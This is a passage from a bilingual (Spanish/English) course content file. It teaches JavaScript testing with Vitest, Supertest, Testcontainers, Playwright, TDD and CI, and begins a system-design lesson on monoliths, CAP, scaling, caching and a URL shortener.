  test: {
    globals: true,
    environment: 'node',
    coverage: {
      provider: 'v8',
      reporter: ['text', 'html'],
    },
  },
});
\`\`\`

### Patron AAA (Arrange, Act, Assert)

\`\`\`javascript
// src/utils/price.ts
export function calculateTotal(items: Item[], taxRate: number): number {
  const subtotal = items.reduce((sum, item) => sum + item.price * item.quantity, 0);
  return subtotal * (1 + taxRate);
}

// src/utils/price.test.ts
import { describe, it, expect } from 'vitest';
import { calculateTotal } from './price';

describe('calculateTotal', () => {
  it('calcula total con impuesto', () => {
    // Arrange - Preparar datos
    const items = [
      { price: 100, quantity: 2 },
      { price: 50, quantity: 1 },
    ];
    const taxRate = 0.16;

    // Act - Ejecutar funcion
    const result = calculateTotal(items, taxRate);

    // Assert - Verificar resultado
    expect(result).toBe(290); // (200 + 50) * 1.16 = 290
  });

  it('retorna 0 para carrito vacio', () => {
    expect(calculateTotal([], 0.16)).toBe(0);
  });

  it('maneja tax rate de 0', () => {
    const items = [{ price: 100, quantity: 1 }];
    expect(calculateTotal(items, 0)).toBe(100);
  });
});
\`\`\`

### Mocking: Cuando y como

\`\`\`javascript
// src/services/user.ts
import { db } from './database';
import { sendEmail } from './email';

export async function createUser(email: string, name: string) {
  const user = await db.user.create({ data: { email, name } });
  await sendEmail(email, 'Welcome!', \`Hello \${name}\`);
  return user;
}

// src/services/user.test.ts
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { createUser } from './user';
import { db } from './database';
import { sendEmail } from './email';

// Mock de modulos externos
vi.mock('./database', () => ({
  db: {
    user: {
      create: vi.fn(),
    },
  },
}));

vi.mock('./email', () => ({
  sendEmail: vi.fn(),
}));

describe('createUser', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('crea usuario y envia email', async () => {
    // Arrange
    const mockUser = { id: 1, email: 'test@example.com', name: 'Test' };
    vi.mocked(db.user.create).mockResolvedValue(mockUser);
    vi.mocked(sendEmail).mockResolvedValue(undefined);

    // Act
    const result = await createUser('test@example.com', 'Test');

    // Assert
    expect(db.user.create).toHaveBeenCalledWith({
      data: { email: 'test@example.com', name: 'Test' },
    });
    expect(sendEmail).toHaveBeenCalledWith(
      'test@example.com',
      'Welcome!',
      'Hello Test'
    );
    expect(result).toEqual(mockUser);
  });
});
\`\`\`

---

## Integration Testing

### Testing de APIs con Supertest

\`\`\`javascript
// src/app.test.ts
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import { app } from './app';
import { db } from './database';

describe('API /users', () => {
  beforeAll(async () => {
    // Setup: limpiar y poblar DB de test
    await db.user.deleteMany();
    await db.user.create({
      data: { email: 'existing@test.com', name: 'Existing' },
    });
  });

  afterAll(async () => {
    await db.$disconnect();
  });

  it('GET /users retorna lista de usuarios', async () => {
    const response = await request(app)
      .get('/users')
      .expect('Content-Type', /json/)
      .expect(200);

    expect(response.body).toHaveLength(1);
    expect(response.body[0].email).toBe('existing@test.com');
  });

  it('POST /users crea nuevo usuario', async () => {
    const response = await request(app)
      .post('/users')
      .send({ email: 'new@test.com', name: 'New User' })
      .expect(201);

    expect(response.body.email).toBe('new@test.com');
  });

  it('POST /users con email duplicado retorna 400', async () => {
    const response = await request(app)
      .post('/users')
      .send({ email: 'existing@test.com', name: 'Duplicate' })
      .expect(400);

    expect(response.body.error).toContain('already exists');
  });
});
\`\`\`

### Testcontainers: Bases de datos reales

\`\`\`javascript
// src/db.test.ts
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { PostgreSqlContainer } from '@testcontainers/postgresql';
import { PrismaClient } from '@prisma/client';

describe('Database Integration', () => {
  let container;
  let prisma;

  beforeAll(async () => {
    // Iniciar contenedor PostgreSQL real
    container = await new PostgreSqlContainer()
      .withDatabase('testdb')
      .start();

    // Conectar Prisma al contenedor
    prisma = new PrismaClient({
      datasources: {
        db: { url: container.getConnectionUri() },
      },
    });

    // Ejecutar migraciones
    await prisma.$executeRaw\`CREATE TABLE users (id SERIAL, email TEXT, name TEXT)\`;
  }, 60000); // Timeout largo para iniciar contenedor

  afterAll(async () => {
    await prisma.$disconnect();
    await container.stop();
  });

  it('inserta y lee usuario de PostgreSQL real', async () => {
    await prisma.$executeRaw\`INSERT INTO users (email, name) VALUES ('test@db.com', 'DB Test')\`;

    const users = await prisma.$queryRaw\`SELECT * FROM users WHERE email = 'test@db.com'\`;

    expect(users).toHaveLength(1);
    expect(users[0].name).toBe('DB Test');
  });
});
\`\`\`

---

## E2E Testing con Playwright

### Setup

\`\`\`bash
npm init playwright@latest
\`\`\`

### Test E2E basico

\`\`\`javascript
// e2e/login.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Login Flow', () => {
  test('usuario puede hacer login', async ({ page }) => {
    // Navegar a la pagina
    await page.goto('/login');

    // Llenar formulario
    await page.fill('[data-testid="email"]', 'user@example.com');
    await page.fill('[data-testid="password"]', 'password123');

    // Click en submit
    await page.click('[data-testid="submit"]');

    // Verificar redireccion a dashboard
    await expect(page).toHaveURL('/dashboard');
    await expect(page.locator('h1')).toContainText('Welcome');
  });

  test('muestra error con credenciales invalidas', async ({ page }) => {
    await page.goto('/login');

    await page.fill('[data-testid="email"]', 'wrong@example.com');
    await page.fill('[data-testid="password"]', 'wrongpass');
    await page.click('[data-testid="submit"]');

    // Verificar mensaje de error
    await expect(page.locator('[data-testid="error"]')).toBeVisible();
    await expect(page.locator('[data-testid="error"]')).toContainText('Invalid credentials');
  });
});
\`\`\`

### Page Object Pattern

\`\`\`javascript
// e2e/pages/LoginPage.ts
import { Page, Locator } from '@playwright/test';

export class LoginPage {
  readonly page: Page;
  readonly emailInput: Locator;
  readonly passwordInput: Locator;
  readonly submitButton: Locator;
  readonly errorMessage: Locator;

  constructor(page: Page) {
    this.page = page;
    this.emailInput = page.locator('[data-testid="email"]');
    this.passwordInput = page.locator('[data-testid="password"]');
    this.submitButton = page.locator('[data-testid="submit"]');
    this.errorMessage = page.locator('[data-testid="error"]');
  }

  async goto() {
    await this.page.goto('/login');
  }

  async login(email: string, password: string) {
    await this.emailInput.fill(email);
    await this.passwordInput.fill(password);
    await this.submitButton.click();
  }
}

// e2e/login.spec.ts (usando Page Object)
import { test, expect } from '@playwright/test';
import { LoginPage } from './pages/LoginPage';

test('login exitoso', async ({ page }) => {
  const loginPage = new LoginPage(page);
  await loginPage.goto();
  await loginPage.login('user@example.com', 'password123');

  await expect(page).toHaveURL('/dashboard');
});
\`\`\`

---

## TDD: Test Driven Development

### El ciclo Red-Green-Refactor

\`\`\`
┌──────────┐     ┌──────────┐     ┌──────────┐
│   RED    │ ──→ │  GREEN   │ ──→ │ REFACTOR │ ──┐
│          │     │          │     │          │   │
│ Escribe  │     │ Escribe  │     │ Mejora   │   │
│ test que │     │ codigo   │     │ codigo   │   │
│ falla    │     │ minimo   │     │ sin      │   │
│          │     │ para     │     │ romper   │   │
│          │     │ pasar    │     │ tests    │   │
└──────────┘     └──────────┘     └──────────┘   │
     ↑                                           │
     └───────────────────────────────────────────┘
\`\`\`

### Ejemplo TDD: Validador de password

\`\`\`javascript
// Paso 1: RED - Test que falla
// password.test.ts
describe('validatePassword', () => {
  it('rechaza password menor a 8 caracteres', () => {
    expect(validatePassword('short')).toBe(false);
  });
});

// validatePassword no existe aun → test falla ✓

// Paso 2: GREEN - Codigo minimo
// password.ts
export function validatePassword(password: string): boolean {
  return password.length >= 8;
}

// Test pasa ✓

// Paso 3: RED - Nuevo requisito
it('rechaza password sin mayusculas', () => {
  expect(validatePassword('lowercase123')).toBe(false);
});

// Test falla ✓

// Paso 4: GREEN
export function validatePassword(password: string): boolean {
  if (password.length < 8) return false;
  if (!/[A-Z]/.test(password)) return false;
  return true;
}

// Paso 5: REFACTOR
export function validatePassword(password: string): boolean {
  const rules = [
    (p: string) => p.length >= 8,
    (p: string) => /[A-Z]/.test(p),
  ];
  return rules.every(rule => rule(password));
}

// Tests siguen pasando ✓
\`\`\`

---

## Coverage: No te obsesiones

### 100% coverage es una trampa

\`\`\`javascript
// Este codigo tiene 100% coverage...
function add(a, b) {
  return a + b;
}

// Con este test...
test('adds numbers', () => {
  expect(add(1, 2)).toBe(3);
});

// Pero que pasa con add('1', '2')? → '12' (bug!)
// Coverage no garantiza calidad
\`\`\`

### Coverage util vs vanity

| Tipo de codigo | Coverage recomendado |
|----------------|---------------------|
| Logica de negocio | 80-90% |
| Utilidades | 90%+ |
| UI components | 60-70% |
| Glue code | 30-50% |

---

## Testing en CI/CD

\`\`\`yaml
# .github/workflows/test.yml
name: Tests
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest

    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: test
        options: >-
          --health-cmd pg_isready
          --health-interval 10s

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci

      - name: Run unit tests
        run: npm run test:unit

      - name: Run integration tests
        run: npm run test:integration
        env:
          DATABASE_URL: postgres://postgres:test@localhost:5432/test

      - name: Run E2E tests
        run: npx playwright test

      - name: Upload coverage
        uses: codecov/codecov-action@v3
\`\`\`

---

## Checklist de testing

- [ ] Unit tests para logica de negocio (80%+ coverage)
- [ ] Integration tests para APIs y DB
- [ ] E2E tests para flujos criticos de usuario
- [ ] Tests corren en CI antes de merge
- [ ] Mocks solo para dependencias externas
- [ ] Tests son independientes (no dependen del orden)
- [ ] Tests son deterministicos (no flaky)

---

## Practica

-> [Testing Fullstack con Vitest + Playwright](/es/cooking/testing-fullstack)
-> [Testing de APIs con Testcontainers](/es/cooking/api-testing)

---

## Recursos

- [Vitest Documentation](https://vitest.dev/)
- [Playwright Documentation](https://playwright.dev/)
- [Testing JavaScript - Kent C. Dodds](https://testingjavascript.com/)
- [Test Driven Development - Kent Beck](https://www.amazon.com/Test-Driven-Development-Kent-Beck/dp/0321146530)
    `,
    contentEn: `
## Your safety net for changes

Imagine youre a surgeon and you have to operate without anesthesia or monitors. Every cut is a risk, and you dont know if something went wrong until its too late. Programming without tests is exactly like that.

> **Tests are not for finding bugs. They are for giving you the confidence to make changes without fear of breaking everything.**

---

## The cost of bugs

| Stage where bug is found | Relative cost |
|--------------------------|---------------|
| During development | 1x |
| During code review | 2x |
| During QA | 10x |
| In production | 100x |
| After losing customers | 1000x |

---

## The testing pyramid

\`\`\`
         /\\
        /E2E\\           Few, slow, fragile
       /──────\\         (5% of your tests)
      /Integration\\     Balance of cost/value
     /──────────────\\   (15% of your tests)
    /   Unit Tests   \\  Many, fast, stable
   /──────────────────\\ (80% of your tests)
\`\`\`

| Type | What it tests | Speed | Fragility |
|------|---------------|-------|-----------|
| **Unit** | A single isolated function | ms | Very stable |
| **Integration** | Multiple modules together | seconds | Moderate |
| **E2E** | Complete flow as a user | minutes | Fragile |

---

## Unit Testing with Vitest

### Basic setup

\`\`\`bash
npm install -D vitest @vitest/coverage-v8
\`\`\`

\`\`\`javascript
// vitest.config.ts
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    globals: true,
    environment: 'node',
    coverage: {
      provider: 'v8',
      reporter: ['text', 'html'],
    },
  },
});
\`\`\`

### AAA Pattern (Arrange, Act, Assert)

\`\`\`javascript
// src/utils/price.ts
export function calculateTotal(items: Item[], taxRate: number): number {
  const subtotal = items.reduce((sum, item) => sum + item.price * item.quantity, 0);
  return subtotal * (1 + taxRate);
}

// src/utils/price.test.ts
import { describe, it, expect } from 'vitest';
import { calculateTotal } from './price';

describe('calculateTotal', () => {
  it('calculates total with tax', () => {
    // Arrange - Prepare data
    const items = [
      { price: 100, quantity: 2 },
      { price: 50, quantity: 1 },
    ];
    const taxRate = 0.16;

    // Act - Execute function
    const result = calculateTotal(items, taxRate);

    // Assert - Verify result
    expect(result).toBe(290); // (200 + 50) * 1.16 = 290
  });

  it('returns 0 for empty cart', () => {
    expect(calculateTotal([], 0.16)).toBe(0);
  });

  it('handles 0 tax rate', () => {
    const items = [{ price: 100, quantity: 1 }];
    expect(calculateTotal(items, 0)).toBe(100);
  });
});
\`\`\`

### Mocking: When and how

\`\`\`javascript
// src/services/user.ts
import { db } from './database';
import { sendEmail } from './email';

export async function createUser(email: string, name: string) {
  const user = await db.user.create({ data: { email, name } });
  await sendEmail(email, 'Welcome!', \`Hello \${name}\`);
  return user;
}

// src/services/user.test.ts
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { createUser } from './user';
import { db } from './database';
import { sendEmail } from './email';

// Mock external modules
vi.mock('./database', () => ({
  db: {
    user: {
      create: vi.fn(),
    },
  },
}));

vi.mock('./email', () => ({
  sendEmail: vi.fn(),
}));

describe('createUser', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('creates user and sends email', async () => {
    // Arrange
    const mockUser = { id: 1, email: 'test@example.com', name: 'Test' };
    vi.mocked(db.user.create).mockResolvedValue(mockUser);
    vi.mocked(sendEmail).mockResolvedValue(undefined);

    // Act
    const result = await createUser('test@example.com', 'Test');

    // Assert
    expect(db.user.create).toHaveBeenCalledWith({
      data: { email: 'test@example.com', name: 'Test' },
    });
    expect(sendEmail).toHaveBeenCalledWith(
      'test@example.com',
      'Welcome!',
      'Hello Test'
    );
    expect(result).toEqual(mockUser);
  });
});
\`\`\`

---

## Integration Testing

### API Testing with Supertest

\`\`\`javascript
// src/app.test.ts
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import { app } from './app';
import { db } from './database';

describe('API /users', () => {
  beforeAll(async () => {
    // Setup: clean and populate test DB
    await db.user.deleteMany();
    await db.user.create({
      data: { email: 'existing@test.com', name: 'Existing' },
    });
  });

  afterAll(async () => {
    await db.$disconnect();
  });

  it('GET /users returns list of users', async () => {
    const response = await request(app)
      .get('/users')
      .expect('Content-Type', /json/)
      .expect(200);

    expect(response.body).toHaveLength(1);
    expect(response.body[0].email).toBe('existing@test.com');
  });

  it('POST /users creates new user', async () => {
    const response = await request(app)
      .post('/users')
      .send({ email: 'new@test.com', name: 'New User' })
      .expect(201);

    expect(response.body.email).toBe('new@test.com');
  });

  it('POST /users with duplicate email returns 400', async () => {
    const response = await request(app)
      .post('/users')
      .send({ email: 'existing@test.com', name: 'Duplicate' })
      .expect(400);

    expect(response.body.error).toContain('already exists');
  });
});
\`\`\`

### Testcontainers: Real databases

\`\`\`javascript
// src/db.test.ts
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { PostgreSqlContainer } from '@testcontainers/postgresql';
import { PrismaClient } from '@prisma/client';

describe('Database Integration', () => {
  let container;
  let prisma;

  beforeAll(async () => {
    // Start real PostgreSQL container
    container = await new PostgreSqlContainer()
      .withDatabase('testdb')
      .start();

    // Connect Prisma to the container
    prisma = new PrismaClient({
      datasources: {
        db: { url: container.getConnectionUri() },
      },
    });

    // Run migrations
    await prisma.$executeRaw\`CREATE TABLE users (id SERIAL, email TEXT, name TEXT)\`;
  }, 60000); // Long timeout to start container

  afterAll(async () => {
    await prisma.$disconnect();
    await container.stop();
  });

  it('inserts and reads user from real PostgreSQL', async () => {
    await prisma.$executeRaw\`INSERT INTO users (email, name) VALUES ('test@db.com', 'DB Test')\`;

    const users = await prisma.$queryRaw\`SELECT * FROM users WHERE email = 'test@db.com'\`;

    expect(users).toHaveLength(1);
    expect(users[0].name).toBe('DB Test');
  });
});
\`\`\`

---

## E2E Testing with Playwright

### Setup

\`\`\`bash
npm init playwright@latest
\`\`\`

### Basic E2E test

\`\`\`javascript
// e2e/login.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Login Flow', () => {
  test('user can log in', async ({ page }) => {
    // Navigate to the page
    await page.goto('/login');

    // Fill form
    await page.fill('[data-testid="email"]', 'user@example.com');
    await page.fill('[data-testid="password"]', 'password123');

    // Click submit
    await page.click('[data-testid="submit"]');

    // Verify redirect to dashboard
    await expect(page).toHaveURL('/dashboard');
    await expect(page.locator('h1')).toContainText('Welcome');
  });

  test('shows error with invalid credentials', async ({ page }) => {
    await page.goto('/login');

    await page.fill('[data-testid="email"]', 'wrong@example.com');
    await page.fill('[data-testid="password"]', 'wrongpass');
    await page.click('[data-testid="submit"]');

    // Verify error message
    await expect(page.locator('[data-testid="error"]')).toBeVisible();
    await expect(page.locator('[data-testid="error"]')).toContainText('Invalid credentials');
  });
});
\`\`\`

### Page Object Pattern

\`\`\`javascript
// e2e/pages/LoginPage.ts
import { Page, Locator } from '@playwright/test';

export class LoginPage {
  readonly page: Page;
  readonly emailInput: Locator;
  readonly passwordInput: Locator;
  readonly submitButton: Locator;
  readonly errorMessage: Locator;

  constructor(page: Page) {
    this.page = page;
    this.emailInput = page.locator('[data-testid="email"]');
    this.passwordInput = page.locator('[data-testid="password"]');
    this.submitButton = page.locator('[data-testid="submit"]');
    this.errorMessage = page.locator('[data-testid="error"]');
  }

  async goto() {
    await this.page.goto('/login');
  }

  async login(email: string, password: string) {
    await this.emailInput.fill(email);
    await this.passwordInput.fill(password);
    await this.submitButton.click();
  }
}

// e2e/login.spec.ts (using Page Object)
import { test, expect } from '@playwright/test';
import { LoginPage } from './pages/LoginPage';

test('successful login', async ({ page }) => {
  const loginPage = new LoginPage(page);
  await loginPage.goto();
  await loginPage.login('user@example.com', 'password123');

  await expect(page).toHaveURL('/dashboard');
});
\`\`\`

---

## TDD: Test Driven Development

### The Red-Green-Refactor cycle

\`\`\`
┌──────────┐     ┌──────────┐     ┌──────────┐
│   RED    │ ──→ │  GREEN   │ ──→ │ REFACTOR │ ──┐
│          │     │          │     │          │   │
│ Write    │     │ Write    │     │ Improve  │   │
│ a test   │     │ minimum  │     │ code     │   │
│ that     │     │ code to  │     │ without  │   │
│ fails    │     │ pass     │     │ breaking │   │
│          │     │          │     │ tests    │   │
└──────────┘     └──────────┘     └──────────┘   │
     ↑                                           │
     └───────────────────────────────────────────┘
\`\`\`

### TDD Example: Password validator

\`\`\`javascript
// Step 1: RED - Failing test
// password.test.ts
describe('validatePassword', () => {
  it('rejects password shorter than 8 characters', () => {
    expect(validatePassword('short')).toBe(false);
  });
});

// validatePassword doesnt exist yet → test fails ✓

// Step 2: GREEN - Minimum code
// password.ts
export function validatePassword(password: string): boolean {
  return password.length >= 8;
}

// Test passes ✓

// Step 3: RED - New requirement
it('rejects password without uppercase letters', () => {
  expect(validatePassword('lowercase123')).toBe(false);
});

// Test fails ✓

// Step 4: GREEN
export function validatePassword(password: string): boolean {
  if (password.length < 8) return false;
  if (!/[A-Z]/.test(password)) return false;
  return true;
}

// Step 5: REFACTOR
export function validatePassword(password: string): boolean {
  const rules = [
    (p: string) => p.length >= 8,
    (p: string) => /[A-Z]/.test(p),
  ];
  return rules.every(rule => rule(password));
}

// Tests still pass ✓
\`\`\`

---

## Coverage: Dont obsess

### 100% coverage is a trap

\`\`\`javascript
// This code has 100% coverage...
function add(a, b) {
  return a + b;
}

// With this test...
test('adds numbers', () => {
  expect(add(1, 2)).toBe(3);
});

// But what about add('1', '2')? → '12' (bug!)
// Coverage doesnt guarantee quality
\`\`\`

### Useful coverage vs vanity

| Code type | Recommended coverage |
|-----------|---------------------|
| Business logic | 80-90% |
| Utilities | 90%+ |
| UI components | 60-70% |
| Glue code | 30-50% |

---

## Testing in CI/CD

\`\`\`yaml
# .github/workflows/test.yml
name: Tests
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest

    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: test
        options: >-
          --health-cmd pg_isready
          --health-interval 10s

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci

      - name: Run unit tests
        run: npm run test:unit

      - name: Run integration tests
        run: npm run test:integration
        env:
          DATABASE_URL: postgres://postgres:test@localhost:5432/test

      - name: Run E2E tests
        run: npx playwright test

      - name: Upload coverage
        uses: codecov/codecov-action@v3
\`\`\`

---

## Testing checklist

- [ ] Unit tests for business logic (80%+ coverage)
- [ ] Integration tests for APIs and DB
- [ ] E2E tests for critical user flows
- [ ] Tests run in CI before merge
- [ ] Mocks only for external dependencies
- [ ] Tests are independent (dont depend on order)
- [ ] Tests are deterministic (not flaky)

---

## Practice

-> [Fullstack Testing with Vitest + Playwright](/en/cooking/testing-fullstack)
-> [API Testing with Testcontainers](/en/cooking/api-testing)

---

## Resources

- [Vitest Documentation](https://vitest.dev/)
- [Playwright Documentation](https://playwright.dev/)
- [Testing JavaScript - Kent C. Dodds](https://testingjavascript.com/)
- [Test Driven Development - Kent Beck](https://www.amazon.com/Test-Driven-Development-Kent-Beck/dp/0321146530)
    `,
  },
  'system-design': {
    contentEs: `
## El arte de diseñar sistemas que escalan

Imagina que eres el arquitecto de un restaurante. No solo decides donde van las mesas, sino como fluye la cocina, cuantos cocineros necesitas, donde almacenas los ingredientes, y que pasa cuando llegan 500 clientes en vez de 50.

El diseño de sistemas es exactamente eso: planificar como construir software que funcione bien hoy y pueda crecer mañana.

> **Un buen diseño de sistema no es el mas complejo, sino el que resuelve el problema actual con espacio para crecer.**

---

## Monolito vs Microservicios

La primera decision arquitectonica que enfrentaras.

### Monolito: Todo en uno

\`\`\`
┌─────────────────────────────────────┐
│           APLICACION                │
│  ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐   │
│  │Auth │ │Users│ │Orders│ │Pay  │   │
│  └─────┘ └─────┘ └─────┘ └─────┘   │
│         Una base de datos           │
│              ┌───┐                  │
│              │ DB│                  │
│              └───┘                  │
└─────────────────────────────────────┘
\`\`\`

**Ventajas:**
- Simple de desarrollar y desplegar
- Facil de debuggear (todo en un lugar)
- Una sola base de datos = consistencia
- Ideal para equipos pequenos (<10 devs)

**Desventajas:**
- Escala todo o nada
- Un bug puede tumbar todo
- Deployments arriesgados
- Dificil de mantener cuando crece

### Microservicios: Divide y conquista

\`\`\`
┌─────────┐  ┌─────────┐  ┌─────────┐
│  Auth   │  │  Users  │  │ Orders  │
│ Service │  │ Service │  │ Service │
└────┬────┘  └────┬────┘  └────┬────┘
     │            │            │
┌────┴────┐  ┌────┴────┐  ┌────┴────┐
│Auth DB  │  │Users DB │  │Orders DB│
└─────────┘  └─────────┘  └─────────┘
\`\`\`

**Ventajas:**
- Escala solo lo que necesitas
- Equipos independientes
- Falla un servicio, no todo
- Tecnologias diferentes por servicio

**Desventajas:**
- Complejidad operacional alta
- Debugging distribuido es dificil
- Consistencia eventual (no inmediata)
- Requiere DevOps maduros

### Cuando usar cada uno

| Escenario | Recomendacion |
|-----------|---------------|
| Startup, MVP, < 5 devs | Monolito |
| Producto probado, > 20 devs | Microservicios |
| Partes con cargas muy diferentes | Hibrido |
| No sabes cual elegir | Monolito |

> **Regla de oro:** Empieza con monolito. Extrae microservicios cuando el dolor sea real, no imaginado.

---

## El Teorema CAP

En sistemas distribuidos, solo puedes tener 2 de 3:

\`\`\`
        Consistency
           /\\
          /  \\
         /    \\
        /      \\
       /   ??   \\
      /          \\
     /____________\\
Availability    Partition
                Tolerance
\`\`\`

- **Consistency (C):** Todos ven los mismos datos al mismo tiempo
- **Availability (A):** El sistema siempre responde
- **Partition Tolerance (P):** Funciona aunque haya fallas de red

### En la practica

Las particiones de red SIEMPRE pueden ocurrir. Entonces realmente eliges entre:

| Sistema | Elige | Sacrifica | Ejemplo |
|---------|-------|-----------|---------|
| **CP** | Consistencia | Disponibilidad | Bancos, inventarios |
| **AP** | Disponibilidad | Consistencia | Redes sociales, cache |

> **Ejemplo real:** En un banco, si hay falla de red, prefieres que el cajero diga "No disponible" (CP) a que te deje retirar dinero que no tienes (AP).

---

## Escalamiento: Vertical vs Horizontal

### Vertical: Maquina mas grande

\`\`\`
Antes:          Despues:
┌─────┐         ┌─────────┐
│ 4GB │   →     │  64GB   │
│ 2CPU│         │  32CPU  │
└─────┘         └─────────┘
\`\`\`

- Simple: solo cambias el servidor
- Tiene limite fisico
- Un solo punto de falla

### Horizontal: Mas maquinas

\`\`\`
Antes:          Despues:
┌─────┐         ┌─────┐ ┌─────┐ ┌─────┐
│ 4GB │   →     │ 4GB │ │ 4GB │ │ 4GB │
└─────┘         └─────┘ └─────┘ └─────┘
\`\`\`

- Teoricamente infinito
- Requiere Load Balancer
- Tu app debe ser stateless

---

## Load Balancers

Distribuyen trafico entre multiples servidores.

\`\`\`
                    ┌─────────┐
                    │  Load   │
        Usuarios →  │Balancer │
                    └────┬────┘
                         │
           ┌─────────────┼─────────────┐
           ▼             ▼             ▼
      ┌─────────┐   ┌─────────┐   ┌─────────┐
      │Server 1 │   │Server 2 │   │Server 3 │
      └─────────┘   └─────────┘   └─────────┘
\`\`\`

### Algoritmos de distribucion

| Algoritmo | Como funciona | Cuando usarlo |
|-----------|---------------|---------------|
| **Round Robin** | 1, 2, 3, 1, 2, 3... | Servidores iguales |
| **Least Connections** | Al que tenga menos | Conexiones largas |
| **IP Hash** | Mismo cliente → mismo server | Sesiones sticky |
| **Weighted** | Mas al mas potente | Servidores diferentes |

---

## Escalando Bases de Datos

### Replicacion: Copias de lectura

\`\`\`
     Writes
        │
        ▼
   ┌─────────┐
   │ Primary │──────────────┐
   │  (RW)   │              │ Replicacion
   └─────────┘              │
        │                   │
        ▼                   ▼
   ┌─────────┐         ┌─────────┐
   │ Replica │         │ Replica │
   │  (RO)   │         │  (RO)   │
   └─────────┘         └─────────┘
        ▲                   ▲
        │                   │
      Reads              Reads
\`\`\`

- Escala lecturas, no escrituras
- Consistencia eventual (retraso de replicacion)

### Sharding: Divide los datos

\`\`\`
user_id 1-1000      user_id 1001-2000    user_id 2001-3000
       │                   │                    │
       ▼                   ▼                    ▼
  ┌─────────┐         ┌─────────┐         ┌─────────┐
  │ Shard 1 │         │ Shard 2 │         │ Shard 3 │
  └─────────┘         └─────────┘         └─────────┘
\`\`\`

- Escala tanto lecturas como escrituras
- Complejidad: JOINs entre shards son costosos
- Elegir buena shard key es critico

---

## Caching: La clave del performance

### Estrategias de cache

**Cache-Aside (Lazy Loading)**
\`\`\`
1. App pide dato
2. Cache miss? → Lee de DB → Guarda en cache
3. Cache hit? → Retorna de cache

┌─────┐  miss   ┌─────┐        ┌────┐
│ App │ ──────→ │Cache│        │ DB │
│     │ ←────── │     │        │    │
└─────┘  hit    └─────┘        └────┘
    │                              ▲
    └──────────────────────────────┘
         miss: lee y guarda
\`\`\`

**Write-Through**
\`\`\`
Escribe en cache Y en DB al mismo tiempo
- Datos siempre consistentes
- Escrituras mas lentas
\`\`\`

**Write-Behind (Write-Back)**
\`\`\`
Escribe en cache, luego async a DB
- Escrituras rapidas
- Riesgo de perder datos si cache falla
\`\`\`

### Que cachear

| Candidato | Prioridad |
|-----------|-----------|
| Datos que no cambian (config) | Alta |
| Datos leidos frecuentemente | Alta |
| Resultados de calculos costosos | Alta |
| Datos de usuario activo | Media |
| Datos que cambian cada segundo | Baja |

---

## Message Queues

Para comunicacion asincrona entre servicios.

\`\`\`
┌─────────┐     ┌─────────────┐     ┌─────────────┐
│Producer │ ──→ │    Queue    │ ──→ │  Consumer   │
│ (API)   │     │ (RabbitMQ)  │     │  (Worker)   │
└─────────┘     └─────────────┘     └─────────────┘
\`\`\`

### Casos de uso

- **Envio de emails:** API encola, worker envia
- **Procesamiento de imagenes:** Upload encola, worker procesa
- **Notificaciones:** Evento encola, multiples consumers notifican

### Herramientas populares

| Tool | Mejor para |
|------|------------|
| **RabbitMQ** | Mensajeria tradicional, routing complejo |
| **Redis Streams** | Simple, ya tienes Redis |
| **Kafka** | Alto volumen, event sourcing |
| **SQS** | AWS nativo, simple |

---

## Caso practico: Disenando un URL Shortener

### Requisitos

**Funcionales:**
- Acortar URL larga → codigo corto
- Redirigir codigo → URL original
- URLs expiran (opcional)

**No funcionales:**
- 100M URLs nuevas/mes
- 10:1 ratio lectura:escritura
- Latencia < 100ms

### Estimaciones

\`\`\`
URLs/mes: 100M
URLs/seg: 100M / (30 * 24 * 3600) ≈ 40 URLs/seg escritura
Lecturas: 40 * 10 = 400 URLs/seg lectura

Storage (5 años):
100M * 12 * 5 = 6B URLs
6B * 500 bytes = 3TB
\`\`\`

### Diseno del codigo corto

Base62: [a-zA-Z0-9] = 62 caracteres

\`\`\`
7 caracteres = 62^7 = 3.5 trillones de combinaciones
Suficiente para 100M/mes por siglos
\`\`\`

### Arquitectura final

\`\`\`
                    ┌───────────┐
     Usuarios  ───→ │    LB     │
                    └─────┬─────┘
                          │
              ┌───────────┴───────────┐
              ▼                       ▼
         ┌─────────┐             ┌─────────┐
         │ API 1   │             │ API 2   │
         └────┬────┘             └────┬────┘
              │                       │
              └───────────┬───────────┘
                          │
                    ┌─────┴─────┐
                    │   Redis   │ (Cache hot URLs)
                    └─────┬─────┘
                          │
                    ┌─────┴─────┐
                    │ Postgres  │ (Sharded by hash)
                    └───────────┘
\`\`\`

---

## Recursos recomendados

- **Libro:** "Designing Data-Intensive Applications" - Martin Kleppmann
- **Libro:** "System Design Interview" - Alex Xu
- **Web:** [system-design-primer](https://github.com/donnemartin/system-design-primer)
- **Practica:** [Exercism System Design](https://exercism.org/)

---

## Practica

-> [Workshop de Arquitectura](/es/cooking/architecture-workshop) - Disena un sistema real paso a paso
    `,
    contentEn: `
## The art of designing systems that scale

Imagine you're the architect of a restaurant. You don't just decide where tables go, but how the kitchen flows, how many cooks you need, where you store ingredients, and what happens when 500 customers arrive instead of 50.

System design is exactly that: planning how to build software that works well today and can grow tomorrow.

> **Good system design isn't the most complex one, but the one that solves the current problem with room to grow.**

---

## Monolith vs Microservices

The first architectural decision you'll face.

### Monolith: All in one

\`\`\`
┌─────────────────────────────────────┐
│           APPLICATION               │
│  ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐   │
│  │Auth │ │Users│ │Orders│ │Pay  │   │
│  └─────┘ └─────┘ └─────┘ └─────┘   │
│         Single database             │
